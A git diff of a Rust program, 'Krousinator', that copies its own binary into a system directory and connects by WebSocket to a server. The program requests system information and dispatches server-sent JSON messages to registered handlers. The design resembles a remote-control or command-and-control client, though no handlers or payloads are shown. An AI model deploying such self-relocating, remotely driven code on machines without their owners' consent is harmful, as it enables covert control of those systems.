@@ -1,80 +1,148 @@
+
 mod registry;
 mod models;
 use crate::registry::{krousinator_interface::KrousinatorInterface, handler_registry::HandlerRegistry};
 use crate::registry::entry::HandlerMeta;
 
+use openssl::error;
+// serd
 use serde_json::Value;
 
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+// ws
+use tokio_tungstenite::connect_async;
+use futures_util::{SinkExt, StreamExt};
+
+// fs
+use tokio::fs::File;
+use std::path::Path;
+use tokio::fs::create_dir_all;
+// tokio utility
+// use tokio::sync::mpsc;
+
+
+#[cfg(target_os = "windows")]
+static DEST_PATH: &str = "C:\\ProgramData\\MyApp";
+
+#[cfg(target_os = "macos")]
+static DEST_PATH: &str = "/usr/local/bin/Krousinator";
+
+#[cfg(target_os = "linux")]
+static DEST_PATH: &str = "/usr/local/bin/Krousinator";
+
+
+
+async fn move_binary() -> Result<(), Box<dyn std::error::Error>> {
+    
+    let binary = std::env::current_exe()?;
+    let mut src = File::open(binary).await?;
+
+    let parent_dir = Path::new(DEST_PATH).parent().unwrap();
+
+    if !parent_dir.exists() {
+        create_dir_all(parent_dir).await?;
+    }
+
+
+    let mut dest = File::create(DEST_PATH).await?;
+
+    let mut buffer = Vec::new();
+    src.read_to_end(&mut buffer).await?;
+    dest.write_all(&buffer).await?;
+
+    Ok(())
+
+}
 
 #[tokio::main]
 async fn main() {
 
 
-    let mut krous = KrousinatorInterface::new();
+
+    // setup
+    // move_binary().unwrap_or_else(|e| panic!("moving binary operation failed: {}", e)).await;
     let mut reg: HandlerRegistry = HandlerRegistry::new();
 
-
+    // regester all handles
     for handler in inventory::iter::<HandlerMeta> {
         reg.register(handler.name, handler.constructor);
     }
-
-
-
-    let incoming = vec![
-        (r#"{"t": "HandleTest", "msg": "Hello from ping"}"#),
-    ];
-    let value: Value = serde_json::from_str(incoming[0]).unwrap();
-    if let Some(t_str) = value.get("t").and_then(|v| v.as_str()) {
-        println!("Type field: {}", t_str);
-        let s = reg.get(t_str, incoming[0]).unwrap_or_else(|| panic!("uh oh krousy"));
-        s.handle(&mut krous);
-    }
-
-    // use crate::models::recv::handle::Handleable;
-    // use serde::de::DeserializeOwned;
     
-    // pub type DynHandlerConstructor = fn(&str) -> Box<dyn Handleable>;
-    
-    // pub struct HandlerMeta {
-    //     pub name: &'static str,
-    //     pub constructor: DynHandlerConstructor,
-    // }
-    
-    // inventory::collect!(HandlerMeta);
-
 
     // let (tx, mut rx) = mpsc::channel(32);
-    // // Establish connection
-    // let tx_clone = tx.clone();
-    // tokio::spawn(async move {
-    //     for i in 0..5 {
-    //         tx_clone.send(()).await.unwrap();
-            
-    //     }
-    // });
+    // Establish connection
 
-    // let (mut ws_stream, _) = connect_async("wss://ws.felixhub.dev").await.expect("Failed to connect");
+    let (ws_stream, _) = connect_async("wss://ws.postman-echo.com/raw").await.expect("ws://localhost:8080");
 
-    // println!("✅ Connected!");
-    // let (mut write, mut read) = ws_stream.split();
-    // let write_object = Arc::new(write);
+    println!("✅ Connected!");
+    let (mut write, mut read) = ws_stream.split();
     
+    for i in 0..10 {
+        write.send("{\"t\":\"SystemInfoReq\"}".into()).await.unwrap();
+        println!("send payload");
+    }
 
-    // write_object.clone();
+    let mut krous: KrousinatorInterface = KrousinatorInterface::new(write);
 
-    // while let Some(msg) = rx.recv().await {
-    //     // println!("📨 Received: {}", msg);
-    // }
 
-    // // 📨 Send a message to the server
-    // let msg = Message::Text("Hello from Rust client!".into());
-    // write_object.send(msg).await.unwrap();
-    // println!("📤 Sent message");
+    // main ingress loop
+    tokio::spawn(async move {
+        loop {
+            match read.next().await {
+                
+                Some(Ok(msg)) => {
+                    let raw_text = match msg.into_text() {
+                        Ok(text) => text,
+                        Err(e) => {
+                            eprintln!("Failed to decode message text: {}", e);
+                            continue;
+                        }
+                    };
+        
+                    
+        
+                    let json: Value = match serde_json::from_str(&raw_text) {
+                        Ok(val) => val,
+                        Err(_) => {
+                            println!("Found non-valid JSON. Skipping.");
+                            continue;
+                        }
+                    };
 
-    // // 📥 Read message from the server
-    // if let Some(Ok(msg)) = read.next().await {
-    //     println!("📬 Received: {}", msg);
-    // }
+                    println!("{}", raw_text);
+        
+                    let message_type = match json.get("t").and_then(|v| v.as_str()) {
+                        Some(t) => t,
+                        None => {
+                            println!("No 't' field found in message. Skipping.");
+                            continue;
+                        }
+                    };
+        
+                    match reg.get(message_type, &raw_text) {
+                        Some(handler) => handler.handle(&mut krous),
+                        None => {
+                            println!("No handler found for type '{}'. Skipping.", message_type);
+                            continue;
+                        }
+                    }
+                }
+                
+                Some(Err(e)) => {
+                    eprintln!("WebSocket error: {}", e);
+                    continue;
+                }
+                None => {
+                    println!("WebSocket stream closed.");
+                    break;
+                }
+            }
+        }        
+    });
+
+    loop {
+        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
+    }
 
     // println!("👋 Done!");
 }
